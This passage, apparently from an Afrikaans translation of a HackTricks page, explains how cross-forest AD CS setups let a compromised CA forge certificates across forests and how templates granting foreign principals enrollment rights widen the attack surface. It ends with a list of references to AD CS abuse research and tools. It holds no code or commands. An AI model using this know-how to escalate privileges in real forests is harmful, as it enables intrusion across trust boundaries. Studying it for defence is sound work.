Die konfigurasie vir **cross-forest enrollment** word relatief eenvoudig gemaak. Die **root CA certificate** van die resource forest word deur administrators aan die **account forests gepubliseer**, en die **enterprise CA**-sertifikate van die resource forest word by die `NTAuthCertificates`- en AIA-containers in elke account forest **gevoeg**. Om dit te verduidelik, verleen hierdie reëling aan die **CA in die resource forest volledige beheer** oor alle ander forests waarvoor PKI deur hierdie CA bestuur word. Indien hierdie CA **deur attackers gekompromitteer word**, kan sertifikate vir alle users in beide die resource- en account forests **deur hulle vervals word**, waardeur die security boundary van die forest verbreek word.<sup>[[6]](#references)</sup>

### Enrollment Privileges aan Foreign Principals Verleen

In multi-forest-omgewings is versigtigheid nodig met betrekking tot Enterprise CAs wat **certificate templates publiseer** wat **Authenticated Users of foreign principals** (users/groups buite die forest waaraan die Enterprise CA behoort) **enrollment- en edit-regte** toelaat.\
Nadat authenticatie oor ’n trust plaasvind, word die **Authenticated Users SID** deur AD by die user se token gevoeg. Dus, indien ’n domain ’n Enterprise CA besit met ’n template wat **Authenticated Users enrollment rights toelaat**, kan ’n template potensieel **deur ’n user uit ’n ander forest gebruik word vir enrollment**. Net so, indien **enrollment rights uitdruklik deur ’n template aan ’n foreign principal toegeken word**, word ’n **cross-forest access-control relationship daardeur geskep**, wat dit vir ’n principal uit een forest moontlik maak om **in ’n template van ’n ander forest te enroll**.

Albei scenario’s lei tot ’n **vergroting van die attack surface** van een forest na ’n ander. Die instellings van die certificate template kan deur ’n attacker uitgebuit word om addisionele privileges in ’n foreign domain te verkry.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Misbruik van Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, New Authentication and Request Methods and more](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Misbruik van Key Trust Account Mapping vir Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – The Tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
{{#include ../../../banners/hacktricks-training.md}}
